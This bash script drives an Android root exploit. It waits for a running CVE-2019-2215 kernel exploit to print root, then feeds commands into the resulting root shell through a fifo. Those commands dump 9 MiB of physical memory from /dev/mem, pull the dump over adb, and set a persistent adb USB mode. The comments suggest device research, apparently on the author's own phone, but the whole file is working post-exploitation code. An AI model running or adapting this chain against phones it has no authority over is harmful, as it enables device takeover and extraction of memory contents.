#!/bin/bash
# The exploit is running free: the retry script was retired just before its
# 15-minute timeout would have killed it (progressing runs must not be killed,
# and PID 5859 was burning ~20% CPU in the SELinux policy stage).
#
# This watcher keeps no timeout of its own: it polls the exploit's output for
# "uid=0(root)" for up to 2 hours, then drives the root shell through the fifo
# (a keeper process holds the write end open so transient writers never signal
# EOF to the shell).  Payload: id, the 9 MiB RAM dump, pull, and the persistent
# USB-mode fix.
set -u
cd "$(dirname "$0")"
OUT=usb_runs/root_dump3_att1.out
IN=/tmp/anedmp3_in
LOG=usb_runs/root_watch.log
say() { echo "$(date '+%H:%M:%S') $*" | tee -a "$LOG"; }

say "watching $OUT for root (no timeout; the exploit keeps its own pace)"
for i in $(seq 1 3600); do
  grep -q "uid=0(root)" "$OUT" 2>/dev/null && break
  if ! pgrep -f "adb shell /data/local/tmp/cve-2019-2215" >/dev/null 2>&1; then
    say "adb client gone before root appeared; tail:"
    tail -3 "$OUT" | sed 's/^/  /'
    exit 1
  fi
  sleep 2
done
if ! grep -q "uid=0(root)" "$OUT" 2>/dev/null; then
  say "no root within 2 hours"
  exit 1
fi
say "ROOT printed; driving the fifo"

runroot() {
  local mark="MK$RANDOM$RANDOM" before
  before=$(wc -c < "$OUT")
  printf 'echo %s\n%s\necho %s\n' "$mark" "$1" "$mark" > "$IN"
  for i in $(seq 1 180); do
    sleep 1
    [ "$(tail -c +$((before+1)) "$OUT" | grep -c "^$mark$")" -ge 2 ] && break
  done
  tail -c +$((before+1)) "$OUT" | awk -v m="$mark" 'BEGIN{n=0} {if ($0==m){n++; next} if (n==1) print}'
}

say "== id:"; runroot 'id' | sed 's/^/  /'
say "== dumping reserved RAM 0x34000000..0x34900000 (9 MiB)"
runroot 'dd if=/dev/mem of=/data/local/tmp/ram_34.bin bs=4096 skip=212992 count=2304 2>/tmp/dd.err; echo dd_rc=$?; cat /tmp/dd.err; ls -la /data/local/tmp/ram_34.bin' | sed 's/^/  /'
say "== pulling"
timeout 300 adb pull /data/local/tmp/ram_34.bin usb_runs/ram_34.bin 2>&1 | tail -1
ls -la usb_runs/ram_34.bin 2>/dev/null || say "no dump landed"
say "== persistent USB mode"
runroot 'setprop persist.sys.usb.config mtp,adb; echo rc=$?' | sed 's/^/  /'
runroot 'echo -n mtp,adb > /data/property/persist.sys.usb.config; echo rc=$?' | sed 's/^/  /'
say "== verify:"
runroot 'getprop persist.sys.usb.config' | sed 's/^/  /'
say "ALL DONE"
